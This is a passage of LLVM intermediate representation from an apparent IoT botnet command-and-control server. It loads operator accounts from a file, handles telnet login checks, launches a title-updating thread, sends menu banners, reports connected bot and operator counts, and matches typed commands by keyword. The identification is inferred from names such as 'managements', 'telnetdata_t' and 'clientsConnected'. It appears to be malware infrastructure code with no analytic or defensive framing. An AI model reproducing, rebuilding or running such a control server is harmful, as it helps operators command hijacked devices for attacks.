  %68 = call i32 @feof(%struct._IO_FILE* %67) #9
  %69 = icmp ne i32 %68, 0
  %70 = xor i1 %69, true
  br i1 %70, label %71, label %76

71:                                               ; preds = %66
  %72 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %73 = call i32 @fgetc(%struct._IO_FILE* %72)
  store i32 %73, i32* %16, align 4
  %74 = load i32, i32* %15, align 4
  %75 = add nsw i32 %74, 1
  store i32 %75, i32* %15, align 4
  br label %66, !llvm.loop !16

76:                                               ; preds = %66
  store i32 0, i32* %17, align 4
  %77 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  call void @rewind(%struct._IO_FILE* %77)
  br label %78

78:                                               ; preds = %83, %76
  %79 = load i32, i32* %17, align 4
  %80 = load i32, i32* %15, align 4
  %81 = sub nsw i32 %80, 1
  %82 = icmp ne i32 %79, %81
  br i1 %82, label %83, label %103

83:                                               ; preds = %78
  %84 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %85 = load i32, i32* %17, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %86
  %88 = getelementptr inbounds %struct.account, %struct.account* %87, i32 0, i32 0
  %89 = getelementptr inbounds [5000 x i8], [5000 x i8]* %88, i64 0, i64 0
  %90 = load i32, i32* %17, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %91
  %93 = getelementptr inbounds %struct.account, %struct.account* %92, i32 0, i32 1
  %94 = getelementptr inbounds [5000 x i8], [5000 x i8]* %93, i64 0, i64 0
  %95 = load i32, i32* %17, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %96
  %98 = getelementptr inbounds %struct.account, %struct.account* %97, i32 0, i32 2
  %99 = getelementptr inbounds [5000 x i8], [5000 x i8]* %98, i64 0, i64 0
  %100 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %84, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.33, i64 0, i64 0), i8* %89, i8* %94, i8* %99)
  %101 = load i32, i32* %17, align 4
  %102 = add nsw i32 %101, 1
  store i32 %102, i32* %17, align 4
  br label %78, !llvm.loop !17

103:                                              ; preds = %78
  %104 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %105 = call i32 (i8*, i8*, ...) @sprintf(i8* %104, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.34, i64 0, i64 0)) #9
  %106 = load i32, i32* %4, align 4
  %107 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %108 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %109 = call i64 @strlen(i8* %108) #8
  %110 = call i64 @send(i32 %106, i8* %107, i64 %109, i32 16384)
  %111 = icmp eq i64 %110, -1
  br i1 %111, label %112, label %113

112:                                              ; preds = %103
  br label %1137

113:                                              ; preds = %103
  %114 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %115 = call i32 (i8*, i8*, ...) @sprintf(i8* %114, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.35, i64 0, i64 0)) #9
  %116 = load i32, i32* %4, align 4
  %117 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %118 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %119 = call i64 @strlen(i8* %118) #8
  %120 = call i64 @send(i32 %116, i8* %117, i64 %119, i32 16384)
  %121 = icmp eq i64 %120, -1
  br i1 %121, label %122, label %123

122:                                              ; preds = %113
  br label %1137

123:                                              ; preds = %113
  %124 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %125 = load i32, i32* %4, align 4
  %126 = call i32 @fdgets(i8* %124, i32 2048, i32 %125)
  %127 = icmp slt i32 %126, 1
  br i1 %127, label %128, label %129

128:                                              ; preds = %123
  br label %1137

129:                                              ; preds = %123
  %130 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @trim(i8* %130)
  %131 = getelementptr inbounds [80 x i8], [80 x i8]* %10, i64 0, i64 0
  %132 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %133 = call i32 (i8*, i8*, ...) @sprintf(i8* %131, i8* %132) #9
  %134 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  store i8* %134, i8** %9, align 8
  %135 = load i8*, i8** %9, align 8
  %136 = call i32 @Search_in_File(i8* %135)
  store i32 %136, i32* %5, align 4
  %137 = load i8*, i8** %9, align 8
  %138 = load i32, i32* %5, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %139
  %141 = getelementptr inbounds %struct.account, %struct.account* %140, i32 0, i32 0
  %142 = getelementptr inbounds [5000 x i8], [5000 x i8]* %141, i64 0, i64 0
  %143 = call i32 @strcmp(i8* %137, i8* %142) #8
  %144 = icmp eq i32 %143, 0
  br i1 %144, label %145, label %174

145:                                              ; preds = %129
  %146 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %147 = call i32 (i8*, i8*, ...) @sprintf(i8* %146, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.37, i64 0, i64 0)) #9
  %148 = load i32, i32* %4, align 4
  %149 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %150 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %151 = call i64 @strlen(i8* %150) #8
  %152 = call i64 @send(i32 %148, i8* %149, i64 %151, i32 16384)
  %153 = icmp eq i64 %152, -1
  br i1 %153, label %154, label %155

154:                                              ; preds = %145
  br label %1137

155:                                              ; preds = %145
  %156 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %157 = load i32, i32* %4, align 4
  %158 = call i32 @fdgets(i8* %156, i32 2048, i32 %157)
  %159 = icmp slt i32 %158, 1
  br i1 %159, label %160, label %161

160:                                              ; preds = %155
  br label %1137

161:                                              ; preds = %155
  %162 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @trim(i8* %162)
  %163 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %164 = load i32, i32* %5, align 4
  %165 = sext i32 %164 to i64
  %166 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %165
  %167 = getelementptr inbounds %struct.account, %struct.account* %166, i32 0, i32 1
  %168 = getelementptr inbounds [5000 x i8], [5000 x i8]* %167, i64 0, i64 0
  %169 = call i32 @strcmp(i8* %163, i8* %168) #8
  %170 = icmp ne i32 %169, 0
  br i1 %170, label %171, label %172

171:                                              ; preds = %161
  br label %175

172:                                              ; preds = %161
  %173 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %173, i8 0, i64 2048, i1 false)
  br label %211

174:                                              ; preds = %129
  br label %175

175:                                              ; preds = %174, %171
  %176 = load i8*, i8** %3, align 8
  %177 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %176) #9
  %178 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %178, i8 0, i64 2048, i1 false)
  %179 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %180 = call i32 (i8*, i8*, ...) @sprintf(i8* %179, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.38, i64 0, i64 0)) #9
  %181 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %182 = call i32 (i8*, i8*, ...) @sprintf(i8* %181, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.39, i64 0, i64 0)) #9
  %183 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %184 = call i32 (i8*, i8*, ...) @sprintf(i8* %183, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.40, i64 0, i64 0)) #9
  %185 = call i32 @sleep(i32 1)
  %186 = load i32, i32* %4, align 4
  %187 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %188 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %189 = call i64 @strlen(i8* %188) #8
  %190 = call i64 @send(i32 %186, i8* %187, i64 %189, i32 16384)
  %191 = icmp eq i64 %190, -1
  br i1 %191, label %192, label %193

192:                                              ; preds = %175
  br label %1137

193:                                              ; preds = %175
  %194 = load i32, i32* %4, align 4
  %195 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %196 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %197 = call i64 @strlen(i8* %196) #8
  %198 = call i64 @send(i32 %194, i8* %195, i64 %197, i32 16384)
  %199 = icmp eq i64 %198, -1
  br i1 %199, label %200, label %201

200:                                              ; preds = %193
  br label %1137

201:                                              ; preds = %193
  %202 = load i32, i32* %4, align 4
  %203 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %204 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %205 = call i64 @strlen(i8* %204) #8
  %206 = call i64 @send(i32 %202, i8* %203, i64 %205, i32 16384)
  %207 = icmp eq i64 %206, -1
  br i1 %207, label %208, label %209

208:                                              ; preds = %201
  br label %1137

209:                                              ; preds = %201
  %210 = call i32 @sleep(i32 7)
  br label %1137

211:                                              ; preds = %1080, %172
  %212 = load i8*, i8** %3, align 8
  %213 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %212) #9
  %214 = load i32, i32* %4, align 4
  %215 = call i64 @send(i32 %214, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.41, i64 0, i64 0), i64 14, i32 16384)
  %216 = icmp eq i64 %215, -1
  br i1 %216, label %217, label %218

217:                                              ; preds = %211
  br label %1137

218:                                              ; preds = %211
  %219 = load i32, i32* %4, align 4
  %220 = call i64 @send(i32 %219, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.42, i64 0, i64 0), i64 2, i32 16384)
  %221 = icmp eq i64 %220, -1
  br i1 %221, label %222, label %223

222:                                              ; preds = %218
  br label %1137

223:                                              ; preds = %218
  %224 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %225 = call i32 (i8*, i8*, ...) @sprintf(i8* %224, i8* getelementptr inbounds ([194 x i8], [194 x i8]* @.str.43, i64 0, i64 0)) #9
  %226 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %227 = call i32 (i8*, i8*, ...) @sprintf(i8* %226, i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.44, i64 0, i64 0)) #9
  %228 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %229 = call i32 (i8*, i8*, ...) @sprintf(i8* %228, i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.45, i64 0, i64 0)) #9
  %230 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %231 = call i32 (i8*, i8*, ...) @sprintf(i8* %230, i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.46, i64 0, i64 0)) #9
  %232 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %233 = call i32 (i8*, i8*, ...) @sprintf(i8* %232, i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.47, i64 0, i64 0)) #9
  %234 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %235 = call i32 (i8*, i8*, ...) @sprintf(i8* %234, i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.48, i64 0, i64 0)) #9
  %236 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %237 = call i32 (i8*, i8*, ...) @sprintf(i8* %236, i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.49, i64 0, i64 0)) #9
  %238 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %239 = call i32 (i8*, i8*, ...) @sprintf(i8* %238, i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.50, i64 0, i64 0)) #9
  %240 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %241 = call i32 (i8*, i8*, ...) @sprintf(i8* %240, i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.51, i64 0, i64 0)) #9
  %242 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %243 = call i32 (i8*, i8*, ...) @sprintf(i8* %242, i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.52, i64 0, i64 0)) #9
  %244 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %245 = call i32 (i8*, i8*, ...) @sprintf(i8* %244, i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.53, i64 0, i64 0)) #9
  %246 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %247 = call i32 (i8*, i8*, ...) @sprintf(i8* %246, i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.54, i64 0, i64 0)) #9
  %248 = load i32, i32* %4, align 4
  %249 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %250 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %251 = call i64 @strlen(i8* %250) #8
  %252 = call i64 @send(i32 %248, i8* %249, i64 %251, i32 16384)
  %253 = icmp eq i64 %252, -1
  br i1 %253, label %254, label %255

254:                                              ; preds = %223
  br label %1137

255:                                              ; preds = %223
  %256 = load i32, i32* %4, align 4
  %257 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %258 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %259 = call i64 @strlen(i8* %258) #8
  %260 = call i64 @send(i32 %256, i8* %257, i64 %259, i32 16384)
  %261 = icmp eq i64 %260, -1
  br i1 %261, label %262, label %263

262:                                              ; preds = %255
  br label %1137

263:                                              ; preds = %255
  %264 = load i32, i32* %4, align 4
  %265 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %266 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %267 = call i64 @strlen(i8* %266) #8
  %268 = call i64 @send(i32 %264, i8* %265, i64 %267, i32 16384)
  %269 = icmp eq i64 %268, -1
  br i1 %269, label %270, label %271

270:                                              ; preds = %263
  br label %1137

271:                                              ; preds = %263
  %272 = load i32, i32* %4, align 4
  %273 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %274 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %275 = call i64 @strlen(i8* %274) #8
  %276 = call i64 @send(i32 %272, i8* %273, i64 %275, i32 16384)
  %277 = icmp eq i64 %276, -1
  br i1 %277, label %278, label %279

278:                                              ; preds = %271
  br label %1137

279:                                              ; preds = %271
  %280 = load i32, i32* %4, align 4
  %281 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %282 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %283 = call i64 @strlen(i8* %282) #8
  %284 = call i64 @send(i32 %280, i8* %281, i64 %283, i32 16384)
  %285 = icmp eq i64 %284, -1
  br i1 %285, label %286, label %287

286:                                              ; preds = %279
  br label %1137

287:                                              ; preds = %279
  %288 = load i32, i32* %4, align 4
  %289 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %290 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %291 = call i64 @strlen(i8* %290) #8
  %292 = call i64 @send(i32 %288, i8* %289, i64 %291, i32 16384)
  %293 = icmp eq i64 %292, -1
  br i1 %293, label %294, label %295

294:                                              ; preds = %287
  br label %1137

295:                                              ; preds = %287
  %296 = load i32, i32* %4, align 4
  %297 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %298 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %299 = call i64 @strlen(i8* %298) #8
  %300 = call i64 @send(i32 %296, i8* %297, i64 %299, i32 16384)
  %301 = icmp eq i64 %300, -1
  br i1 %301, label %302, label %303

302:                                              ; preds = %295
  br label %1137

303:                                              ; preds = %295
  %304 = load i32, i32* %4, align 4
  %305 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %306 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %307 = call i64 @strlen(i8* %306) #8
  %308 = call i64 @send(i32 %304, i8* %305, i64 %307, i32 16384)
  %309 = icmp eq i64 %308, -1
  br i1 %309, label %310, label %311

310:                                              ; preds = %303
  br label %1137

311:                                              ; preds = %303
  %312 = load i32, i32* %4, align 4
  %313 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %314 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %315 = call i64 @strlen(i8* %314) #8
  %316 = call i64 @send(i32 %312, i8* %313, i64 %315, i32 16384)
  %317 = icmp eq i64 %316, -1
  br i1 %317, label %318, label %319

318:                                              ; preds = %311
  br label %1137

319:                                              ; preds = %311
  %320 = load i32, i32* %4, align 4
  %321 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %322 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %323 = call i64 @strlen(i8* %322) #8
  %324 = call i64 @send(i32 %320, i8* %321, i64 %323, i32 16384)
  %325 = icmp eq i64 %324, -1
  br i1 %325, label %326, label %327

326:                                              ; preds = %319
  br label %1137

327:                                              ; preds = %319
  %328 = load i32, i32* %4, align 4
  %329 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %330 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %331 = call i64 @strlen(i8* %330) #8
  %332 = call i64 @send(i32 %328, i8* %329, i64 %331, i32 16384)
  %333 = icmp eq i64 %332, -1
  br i1 %333, label %334, label %335

334:                                              ; preds = %327
  br label %1137

335:                                              ; preds = %327
  %336 = load i32, i32* %4, align 4
  %337 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %338 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %339 = call i64 @strlen(i8* %338) #8
  %340 = call i64 @send(i32 %336, i8* %337, i64 %339, i32 16384)
  %341 = icmp eq i64 %340, -1
  br i1 %341, label %342, label %343

342:                                              ; preds = %335
  br label %1137

343:                                              ; preds = %335
  br label %344

344:                                              ; preds = %343
  %345 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %346 = load i32, i32* %5, align 4
  %347 = sext i32 %346 to i64
  %348 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %347
  %349 = getelementptr inbounds %struct.account, %struct.account* %348, i32 0, i32 2
  %350 = getelementptr inbounds [5000 x i8], [5000 x i8]* %349, i64 0, i64 0
  %351 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %352 = call i32 (i8*, i8*, ...) @sprintf(i8* %345, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.55, i64 0, i64 0), i8* %350, i8* %351) #9
  %353 = load i32, i32* %4, align 4
  %354 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %355 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %356 = call i64 @strlen(i8* %355) #8
  %357 = call i64 @send(i32 %353, i8* %354, i64 %356, i32 16384)
  %358 = icmp eq i64 %357, -1
  br i1 %358, label %359, label %360

359:                                              ; preds = %344
  br label %1137

360:                                              ; preds = %344
  br label %361

361:                                              ; preds = %360
  %362 = load i8*, i8** %3, align 8
  %363 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %362) #9
  %364 = load i32, i32* %4, align 4
  %365 = sext i32 %364 to i64
  %366 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %365
  %367 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %366, i32 0, i32 1
  store i32 1, i32* %367, align 4
  br label %368

368:                                              ; preds = %1113, %1112, %631, %538, %361
  %369 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %370 = load i32, i32* %4, align 4
  %371 = call i32 @fdgets(i8* %369, i32 2048, i32 %370)
  %372 = icmp sgt i32 %371, 0
  br i1 %372, label %373, label %1136

373:                                              ; preds = %368
  %374 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %375 = call i8* @strstr(i8* %374, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.56, i64 0, i64 0)) #8
  %376 = icmp ne i8* %375, null
  br i1 %376, label %389, label %377

377:                                              ; preds = %373
  %378 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %379 = call i8* @strstr(i8* %378, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i64 0, i64 0)) #8
  %380 = icmp ne i8* %379, null
  br i1 %380, label %389, label %381

381:                                              ; preds = %377
  %382 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %383 = call i8* @strstr(i8* %382, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.58, i64 0, i64 0)) #8
  %384 = icmp ne i8* %383, null
  br i1 %384, label %389, label %385

385:                                              ; preds = %381
  %386 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %387 = call i8* @strstr(i8* %386, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.59, i64 0, i64 0)) #8
  %388 = icmp ne i8* %387, null
  br i1 %388, label %389, label %402

389:                                              ; preds = %385, %381, %377, %373
  %390 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %391 = call i32 @clientsConnected()
  %392 = load volatile i32, i32* @managesConnected, align 4
  %393 = call i32 (i8*, i8*, ...) @sprintf(i8* %390, i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.60, i64 0, i64 0), i32 %391, i32 %392) #9
  %394 = load i32, i32* %4, align 4
  %395 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %396 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %397 = call i64 @strlen(i8* %396) #8
  %398 = call i64 @send(i32 %394, i8* %395, i64 %397, i32 16384)
  %399 = icmp eq i64 %398, -1
  br i1 %399, label %400, label %401

400:                                              ; preds = %389
  br label %401

401:                                              ; preds = %400, %389
  br label %402

402:                                              ; preds = %401, %385
  %403 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %404 = call i8* @strstr(i8* %403, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i64 0, i64 0)) #8
  %405 = icmp ne i8* %404, null
  br i1 %405, label %418, label %406

406:                                              ; preds = %402
  %407 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %408 = call i8* @strstr(i8* %407, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.62, i64 0, i64 0)) #8
  %409 = icmp ne i8* %408, null
  br i1 %409, label %418, label %410

410:                                              ; preds = %406
  %411 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %412 = call i8* @strstr(i8* %411, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i64 0, i64 0)) #8
  %413 = icmp ne i8* %412, null
  br i1 %413, label %418, label %414

414:                                              ; preds = %410
  %415 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %416 = call i8* @strstr(i8* %415, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.64, i64 0, i64 0)) #8
  %417 = icmp ne i8* %416, null
  br i1 %417, label %418, label %539

418:                                              ; preds = %414, %410, %406, %402
  %419 = getelementptr inbounds [800 x i8], [800 x i8]* %33, i64 0, i64 0
  %420 = call i32 (i8*, i8*, ...) @sprintf(i8* %419, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.65, i64 0, i64 0)) #9
  %421 = getelementptr inbounds [800 x i8], [800 x i8]* %34, i64 0, i64 0
  %422 = call i32 (i8*, i8*, ...) @sprintf(i8* %421, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.66, i64 0, i64 0)) #9
  %423 = getelementptr inbounds [800 x i8], [800 x i8]* %35, i64 0, i64 0
  %424 = call i32 (i8*, i8*, ...) @sprintf(i8* %423, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.67, i64 0, i64 0)) #9
  %425 = getelementptr inbounds [800 x i8], [800 x i8]* %36, i64 0, i64 0
  %426 = call i32 (i8*, i8*, ...) @sprintf(i8* %425, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.68, i64 0, i64 0)) #9
  %427 = getelementptr inbounds [800 x i8], [800 x i8]* %37, i64 0, i64 0
  %428 = call i32 (i8*, i8*, ...) @sprintf(i8* %427, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.69, i64 0, i64 0)) #9
  %429 = getelementptr inbounds [800 x i8], [800 x i8]* %38, i64 0, i64 0
  %430 = call i32 (i8*, i8*, ...) @sprintf(i8* %429, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.70, i64 0, i64 0)) #9
  %431 = getelementptr inbounds [800 x i8], [800 x i8]* %39, i64 0, i64 0
  %432 = call i32 (i8*, i8*, ...) @sprintf(i8* %431, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.71, i64 0, i64 0)) #9
  %433 = getelementptr inbounds [800 x i8], [800 x i8]* %40, i64 0, i64 0
  %434 = call i32 (i8*, i8*, ...) @sprintf(i8* %433, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.72, i64 0, i64 0)) #9
  %435 = getelementptr inbounds [800 x i8], [800 x i8]* %41, i64 0, i64 0
  %436 = call i32 (i8*, i8*, ...) @sprintf(i8* %435, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.73, i64 0, i64 0)) #9
  %437 = getelementptr inbounds [800 x i8], [800 x i8]* %42, i64 0, i64 0
  %438 = call i32 (i8*, i8*, ...) @sprintf(i8* %437, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.74, i64 0, i64 0)) #9
  %439 = load i32, i32* %4, align 4
  %440 = getelementptr inbounds [800 x i8], [800 x i8]* %33, i64 0, i64 0
  %441 = getelementptr inbounds [800 x i8], [800 x i8]* %33, i64 0, i64 0
  %442 = call i64 @strlen(i8* %441) #8
  %443 = call i64 @send(i32 %439, i8* %440, i64 %442, i32 16384)
  %444 = icmp eq i64 %443, -1
  br i1 %444, label %445, label %446

445:                                              ; preds = %418
  br label %1137

446:                                              ; preds = %418
  %447 = load i32, i32* %4, align 4
  %448 = getelementptr inbounds [800 x i8], [800 x i8]* %34, i64 0, i64 0
  %449 = getelementptr inbounds [800 x i8], [800 x i8]* %34, i64 0, i64 0
  %450 = call i64 @strlen(i8* %449) #8
  %451 = call i64 @send(i32 %447, i8* %448, i64 %450, i32 16384)
  %452 = icmp eq i64 %451, -1
  br i1 %452, label %453, label %454

453:                                              ; preds = %446
  br label %1137

454:                                              ; preds = %446
  %455 = load i32, i32* %4, align 4
  %456 = getelementptr inbounds [800 x i8], [800 x i8]* %35, i64 0, i64 0
  %457 = getelementptr inbounds [800 x i8], [800 x i8]* %35, i64 0, i64 0
  %458 = call i64 @strlen(i8* %457) #8
  %459 = call i64 @send(i32 %455, i8* %456, i64 %458, i32 16384)
  %460 = icmp eq i64 %459, -1
  br i1 %460, label %461, label %462

461:                                              ; preds = %454
  br label %1137

462:                                              ; preds = %454
  %463 = load i32, i32* %4, align 4
  %464 = getelementptr inbounds [800 x i8], [800 x i8]* %36, i64 0, i64 0
  %465 = getelementptr inbounds [800 x i8], [800 x i8]* %36, i64 0, i64 0
  %466 = call i64 @strlen(i8* %465) #8
  %467 = call i64 @send(i32 %463, i8* %464, i64 %466, i32 16384)
  %468 = icmp eq i64 %467, -1
  br i1 %468, label %469, label %470

469:                                              ; preds = %462
  br label %1137

470:                                              ; preds = %462
  %471 = load i32, i32* %4, align 4
  %472 = getelementptr inbounds [800 x i8], [800 x i8]* %37, i64 0, i64 0
  %473 = getelementptr inbounds [800 x i8], [800 x i8]* %37, i64 0, i64 0
  %474 = call i64 @strlen(i8* %473) #8
  %475 = call i64 @send(i32 %471, i8* %472, i64 %474, i32 16384)
  %476 = icmp eq i64 %475, -1
  br i1 %476, label %477, label %478

477:                                              ; preds = %470
  br label %1137

478:                                              ; preds = %470
  %479 = load i32, i32* %4, align 4
  %480 = getelementptr inbounds [800 x i8], [800 x i8]* %38, i64 0, i64 0
